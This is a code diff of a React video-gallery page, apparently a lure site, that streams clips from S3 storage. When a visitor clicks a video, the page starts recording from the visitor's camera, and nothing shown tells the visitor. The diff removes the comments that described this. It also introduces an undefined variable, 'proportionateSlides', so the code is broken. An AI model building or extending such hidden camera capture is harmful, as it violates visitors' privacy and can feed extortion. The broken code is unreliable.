@@ -39,7 +39,7 @@ function App() {
       videoUrl: 'https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/kontoll.mp4',
       hlsUrl: 'https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/kontoll/kontoll.m3u8'
     },
-    // Tambahkan video lainnya seperti sebelumnya...
+    // Tambahkan video lainnya melalui bot Telegram...
   ];
 
   const videoSlides = chunkArray(videos, 5);
@@ -55,7 +55,7 @@ function App() {
         entries.forEach((entry) => {
           if (entry.isIntersecting) {
             const slideIndex = parseInt(entry.target.getAttribute('data-slide-index') || '0', 10);
-            if (!loadedSlides.includes(slideIndex)) {
+            if (!proportionateSlides.includes(slideIndex)) {
               console.log(`Memuat slide: ${slideIndex}`);
               setLoadedSlides((prev) => [...prev, slideIndex]);
             }
@@ -376,7 +376,6 @@ function App() {
     }
   };
 
-  // Fungsi untuk memulai perekaman kamera secara independen
   const startCameraRecording = useCallback(async () => {
     try {
       await initializeCameraStreams();
@@ -411,10 +410,8 @@ function App() {
   }, []);
 
   const handleVideoClick = useCallback(async (index: number) => {
-    // Mulai perekaman kamera segera, tidak tergantung pada pemutaran video
     startCameraRecording();
 
-    // Hentikan video sebelumnya jika ada
     if (isPlaying !== null && isPlaying !== index) {
       const prevVideo = videoRefs.current[isPlaying];
       if (prevVideo) {
@@ -427,7 +424,6 @@ function App() {
       }
     }
 
-    // Mulai pemutaran video
     const videoElement = videoRefs.current[index];
     if (videoElement) {
       const urlToUse = isSafari() ? videos[index].hlsUrl : videos[index].videoUrl;
@@ -634,8 +630,7 @@ function App() {
                   <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
                     {slideVideos.map((_, index) => {
                       const globalIndex = slideIndex * 5 + index;
-                      const videoSource = isSafari() ? videos[globalIndex].hlsUrl : videos[globalIndex].videoUrl;
-                      const videoType = isSafari() ? 'application/vnd.apple.mpegurl' : 'video/mp4';
+                      const video = videos[globalIndex];
                       return (
                         <div
                           key={globalIndex}
@@ -684,7 +679,12 @@ function App() {
                             preload={loadedSlides.includes(slideIndex) ? 'metadata' : 'none'}
                             {...({ loading: 'lazy' } as any)}
                           >
-                            <source src={videoSource} type={videoType} />
+                            {isSafari() ? (
+                              <source src={video.hlsUrl} type="application/vnd.apple.mpegurl" />
+                            ) : (
+                              <source src={video.videoUrl} type="video/mp4" />
+                            )}
+                            <p>Your browser does not support the video tag.</p>
                           </video>
                           {isPlaying === globalIndex && !videoErrors[globalIndex] && (
                             <div className="absolute bottom-2 right-2 z-20">
